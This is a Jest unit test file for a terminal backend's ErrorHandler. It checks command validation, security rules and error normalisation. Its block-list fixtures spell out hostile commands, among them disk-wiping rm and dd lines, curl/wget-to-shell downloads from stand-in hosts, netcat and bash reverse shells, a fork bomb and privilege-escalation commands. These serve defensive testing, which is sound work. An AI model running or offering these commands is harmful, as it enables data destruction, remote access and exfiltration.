/**
 * Unit Tests for ErrorHandler
 * Tests security validation, error normalization, and command filtering
 */

const ErrorHandler = require('../../modules/terminal-backend/error-handler');

describe('ErrorHandler', () => {
  let errorHandler;

  beforeEach(() => {
    errorHandler = new ErrorHandler();
  });

  describe('Command Validation', () => {
    test('should allow safe commands', () => {
      const safeCommands = [
        'ls -la',
        'echo "Hello World"',
        'pwd',
        'date',
        'whoami',
        'cat file.txt',
        'grep "pattern" file.txt',
        'node --version',
        'npm list'
      ];

      safeCommands.forEach(command => {
        const result = errorHandler.validateCommand(command);
        expect(result.isValid).toBe(true);
        expect(result.reason).toBeUndefined();
      });
    });

    test('should block dangerous commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'rm -rf *',
        'dd if=/dev/zero of=/dev/sda',
        'mkfs.ext4 /dev/sda1',
        'format c:',
        'del /s /q C:\\*',
        'sudo rm -rf /',
        'chmod 777 /etc/passwd'
      ];

      dangerousCommands.forEach(command => {
        const result = errorHandler.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.reason).toBeDefined();
        expect(result.reason).toContain('dangerous');
      });
    });

    test('should block commands with suspicious patterns', () => {
      const suspiciousCommands = [
        'curl http://malicious.com/script.sh | bash',
        'wget -O - http://evil.com/payload | sh',
        'python -c "import os; os.system(\'rm -rf /\')"',
        'eval $(curl -s http://bad.com/script)',
        'nc -l -p 1234 -e /bin/bash',
        'bash -i >& /dev/tcp/192.168.1.1/4444 0>&1'
      ];

      suspiciousCommands.forEach(command => {
        const result = errorHandler.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.reason).toBeDefined();
      });
    });

    test('should handle empty or null commands', () => {
      const invalidInputs = [null, undefined, '', '   ', '\t\n'];

      invalidInputs.forEach(input => {
        const result = errorHandler.validateCommand(input);
        expect(result.isValid).toBe(false);
        expect(result.reason).toContain('empty');
      });
    });

    test('should handle commands with special characters safely', () => {
      const specialCommands = [
        'echo "Hello & goodbye"',
        'grep "test|pattern" file.txt',
        'find . -name "*.js" -exec echo {} \\;',
        'awk \'{print $1}\' file.txt'
      ];

      specialCommands.forEach(command => {
        const result = errorHandler.validateCommand(command);
        // These should be valid as they're legitimate uses of special chars
        expect(result.isValid).toBe(true);
      });
    });
  });

  describe('Custom Security Rules', () => {
    test('should allow customization of blacklist', () => {
      const customHandler = new ErrorHandler({
        additionalBlacklist: ['custom-dangerous-command', 'forbidden-tool']
      });

      const result1 = customHandler.validateCommand('custom-dangerous-command');
      expect(result1.isValid).toBe(false);

      const result2 = customHandler.validateCommand('forbidden-tool --help');
      expect(result2.isValid).toBe(false);
    });

    test('should allow customization of whitelist', () => {
      const customHandler = new ErrorHandler({
        whitelist: ['rm'], // Normally dangerous, but whitelisted
        strictMode: false
      });

      // This would normally be blocked, but whitelist overrides
      const result = customHandler.validateCommand('rm file.txt');
      expect(result.isValid).toBe(true);
    });

    test('should respect strict mode settings', () => {
      const strictHandler = new ErrorHandler({ strictMode: true });
      const lenientHandler = new ErrorHandler({ strictMode: false });

      const borderlineCommand = 'sudo apt update';

      const strictResult = strictHandler.validateCommand(borderlineCommand);
      const lenientResult = lenientHandler.validateCommand(borderlineCommand);

      // In strict mode, sudo commands might be more restricted
      expect(strictResult.isValid).toBe(false);
      expect(lenientResult.isValid).toBe(true);
    });
  });

  describe('Platform-specific Validation', () => {
    test('should handle Windows-specific dangerous commands', () => {
      const windowsCommands = [
        'format c: /q',
        'del /s /q c:\\*',
        'rd /s /q c:\\windows',
        'reg delete HKLM\\SOFTWARE /f',
        'shutdown /s /f /t 0',
        'taskkill /f /im explorer.exe'
      ];

      windowsCommands.forEach(command => {
        const result = errorHandler.validateCommand(command, 'windows');
        expect(result.isValid).toBe(false);
      });
    });

    test('should handle Unix-specific dangerous commands', () => {
      const unixCommands = [
        'sudo rm -rf /',
        'chmod 000 /etc',
        'dd if=/dev/urandom of=/dev/sda',
        'kill -9 -1',
        'fork(){fork|fork&};fork',
        'echo "malicious" > /etc/passwd'
      ];

      unixCommands.forEach(command => {
        const result = errorHandler.validateCommand(command, 'linux');
        expect(result.isValid).toBe(false);
      });
    });

    test('should allow platform-appropriate safe commands', () => {
      const windowsSafeCommands = [
        'dir',
        'type file.txt',
        'Get-Date',
        'Get-Process'
      ];

      const unixSafeCommands = [
        'ls -la',
        'cat file.txt',
        'ps aux',
        'df -h'
      ];

      windowsSafeCommands.forEach(command => {
        const result = errorHandler.validateCommand(command, 'windows');
        expect(result.isValid).toBe(true);
      });

      unixSafeCommands.forEach(command => {
        const result = errorHandler.validateCommand(command, 'linux');
        expect(result.isValid).toBe(true);
      });
    });
  });

  describe('Error Normalization', () => {
    test('should normalize common error patterns', () => {
      const testErrors = [
        {
          input: new Error('ENOENT: no such file or directory'),
          expected: 'File or directory not found'
        },
        {
          input: new Error('EACCES: permission denied'),
          expected: 'Permission denied'
        },
        {
          input: new Error('EMFILE: too many open files'),
          expected: 'Too many open files'
        },
        {
          input: new Error('spawn ENOENT'),
          expected: 'Command not found'
        }
      ];

      testErrors.forEach(({ input, expected }) => {
        const normalized = errorHandler.normalizeError(input);
        expect(normalized.message).toContain(expected);
        expect(normalized.type).toBeDefined();
      });
    });

    test('should preserve original error information', () => {
      const originalError = new Error('Custom error message');
      originalError.code = 'CUSTOM_CODE';
      originalError.errno = 123;

      const normalized = errorHandler.normalizeError(originalError);
      
      expect(normalized.originalMessage).toBe('Custom error message');
      expect(normalized.code).toBe('CUSTOM_CODE');
      expect(normalized.errno).toBe(123);
    });

    test('should handle non-Error objects gracefully', () => {
      const nonErrorInputs = [
        'string error',
        { message: 'object error' },
        123,
        null,
        undefined
      ];

      nonErrorInputs.forEach(input => {
        const normalized = errorHandler.normalizeError(input);
        expect(normalized).toBeDefined();
        expect(normalized.message).toBeDefined();
        expect(normalized.type).toBe('unknown');
      });
    });

    test('should categorize errors by type', () => {
      const errorCategories = [
        { error: new Error('ENOENT'), expectedType: 'file_not_found' },
        { error: new Error('EACCES'), expectedType: 'permission_denied' },
        { error: new Error('TIMEOUT'), expectedType: 'timeout' },
        { error: new Error('Network error'), expectedType: 'network' },
        { error: new Error('Unknown issue'), expectedType: 'unknown' }
      ];

      errorCategories.forEach(({ error, expectedType }) => {
        const normalized = errorHandler.normalizeError(error);
        expect(normalized.type).toBe(expectedType);
      });
    });
  });

  describe('Security Context', () => {
    test('should validate commands in security context', () => {
      const securityContext = {
        allowedCommands: ['ls', 'cat', 'echo'],
        blockedPatterns: ['rm', 'delete'],
        maxCommandLength: 100
      };

      const contextHandler = new ErrorHandler({ securityContext });

      // Allowed command
      expect(contextHandler.validateCommand('ls -la').isValid).toBe(true);
      
      // Blocked pattern
      expect(contextHandler.validateCommand('rm file.txt').isValid).toBe(false);
      
      // Command too long
      const longCommand = 'echo ' + 'a'.repeat(200);
      expect(contextHandler.validateCommand(longCommand).isValid).toBe(false);
    });

    test('should handle privilege escalation detection', () => {
      const privilegeCommands = [
        'sudo rm file.txt',
        'su root',
        'runas /user:administrator cmd',
        'powershell -ExecutionPolicy Bypass',
        'bash -p',
        'chmod +s /bin/bash'
      ];

      privilegeCommands.forEach(command => {
        const result = errorHandler.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.reason).toContain('privilege');
      });
    });

    test('should detect code injection attempts', () => {
      const injectionCommands = [
        'echo "test"; rm -rf /',
        'cat file.txt && curl malicious.com',
        'ls | nc attacker.com 1234',
        'find . -exec rm {} \\; && echo "pwned"',
        'grep pattern file.txt || wget evil.com/script'
      ];

      injectionCommands.forEach(command => {
        const result = errorHandler.validateCommand(command);
        expect(result.isValid).toBe(false);
      });
    });
  });

  describe('Logging and Monitoring', () => {
    test('should log security violations', () => {
      const logSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});
      
      const loggingHandler = new ErrorHandler({ enableLogging: true });
      loggingHandler.validateCommand('rm -rf /');
      
      expect(logSpy).toHaveBeenCalledWith(
        expect.stringContaining('Security violation detected')
      );
      
      logSpy.mockRestore();
    });

    test('should track validation metrics', () => {
      const handler = new ErrorHandler({ enableMetrics: true });
      
      // Execute several validations
      handler.validateCommand('ls -la');     // valid
      handler.validateCommand('rm -rf /');   // invalid
      handler.validateCommand('echo test');  // valid
      handler.validateCommand('format c:');  // invalid
      
      const metrics = handler.getMetrics();
      expect(metrics.totalValidations).toBe(4);
      expect(metrics.validCommands).toBe(2);
      expect(metrics.blockedCommands).toBe(2);
      expect(metrics.blockRate).toBe(0.5);
    });

    test('should provide detailed violation reports', () => {
      const handler = new ErrorHandler({ detailedReporting: true });
      
      const result = handler.validateCommand('rm -rf /');
      
      expect(result.isValid).toBe(false);
      expect(result.violation).toBeDefined();
      expect(result.violation.type).toBeDefined();
      expect(result.violation.severity).toBeDefined();
      expect(result.violation.pattern).toBeDefined();
      expect(result.violation.timestamp).toBeDefined();
    });
  });

  describe('Edge Cases and Error Handling', () => {
    test('should handle malformed commands gracefully', () => {
      const malformedCommands = [
        'ls -la \x00\x01\x02',  // null bytes
        'echo "unclosed quote',   // unclosed quote
        'cmd\nrm -rf /',          // newline injection
        'test\r\nmalicious',      // CRLF injection
        'normal$(malicious)',     // command substitution
      ];

      malformedCommands.forEach(command => {
        expect(() => {
          const result = errorHandler.validateCommand(command);
          expect(result).toBeDefined();
          expect(typeof result.isValid).toBe('boolean');
        }).not.toThrow();
      });
    });

    test('should handle very long commands', () => {
      const veryLongCommand = 'echo ' + 'a'.repeat(10000);
      
      const result = errorHandler.validateCommand(veryLongCommand);
      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('too long');
    });

    test('should handle unicode and special encoding', () => {
      const unicodeCommands = [
        'echo "测试"',           // Chinese
        'echo "тест"',          // Cyrillic
        'echo "😀"',             // Emoji
        'echo "اختبار"'           // Arabic
      ];

      unicodeCommands.forEach(command => {
        const result = errorHandler.validateCommand(command);
        expect(result.isValid).toBe(true); // Unicode should be allowed in echo
      });
    });
  });
});

